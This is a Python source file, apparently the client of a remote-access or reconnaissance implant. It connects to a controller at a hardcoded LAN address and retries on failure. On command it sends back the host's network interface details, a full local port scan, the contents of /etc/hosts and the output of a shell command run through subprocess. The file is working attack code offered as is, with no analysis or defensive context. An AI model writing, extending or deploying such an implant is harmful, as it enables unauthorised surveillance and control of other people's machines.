import socket
import time
import threading
import subprocess
import json
import sys

class Client:
    def __init__(self):
        self.connection_status = None

        try:
            self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.s.connect(("192.168.1.106", 9000))
            self.connection_status = True
            # self.s.send('connect'.encode())
            print('connected')
        except :
            self.connection_status = False
            print('[!]Connection error, waiting 10 seg for try again')

        if self.connection_status == False:
            timer = threading.Timer(10, self.__init__)
            timer.start()

    def command_execution(self, command):
        return subprocess.check_output(command)

    def netInformation(self):
        import netifaces
        import re
        
        interfaces = {}
        ifaces = netifaces.interfaces()
        ip_regex = r"[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"
        mac_regex = r"[0-9a-f]{2}([-:]?)[0-9a-f]{2}(\1[0-9a-f]{2}){4}"
        for face in ifaces:
            ifaces_info = netifaces.ifaddresses(face)
            keys = ifaces_info.keys()
            for key in keys:
                data = ifaces_info.get(key)[0]
                addr = data.get('addr')
                if re.match(ip_regex, addr) is not None:
                    ip = re.match(ip_regex, addr)
                    ip = ip.group(0)
                if re.match(mac_regex, addr) is not None:
                    mac = re.match(mac_regex, addr)
                    mac = mac.group(0)
            interfaces[face] = {'mac':mac, 'ip':ip}
        interface_json = json.dumps(interfaces)
        self.s.sendall(interface_json.encode('utf-8'))

    def portScanner(self):
        host = socket.gethostbyname('localhost')
        open_ports = []
        for port in range(1,65536):
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = server.connect_ex((host, int(port)))
            if result == 0:
                open_ports.append(port)
                server.close()
        all_ports = {'host':host, 'puertos': open_ports}
        all_ports_json = json.dumps(all_ports)
        self.s.sendall(all_ports_json.encode('utf-8'))

    def hosts_discovery(self):
        with open('/etc/hosts', 'r') as f:
            text = f.read()
        data = json.dumps(text)
        self.s.sendall(data.encode('utf-8'))


    def run(self):
        while True:
            if self.connection_status == True:
                request = self.s.recv(1024)
                print(request)
                
                if "--net_info" == request.decode():
                    self.netInformation()
                if "--port_scanner" == request.decode():
                    self.portScanner()
                if "--get_hosts" == request.decode():
                    self.hosts_discovery()
                if "lsb_release -a" == request.decode(): 
                    command = request.decode()#self.s.recv(1024)
                    print(command + 'comando')
                    command = command.split()
                    output = self.command_execution(command)
                    self.s.send(output)
                if "exit" == request.decode():
                    sys.exit(0)
            

################################################################################################        


cliente = Client()
cliente.run()
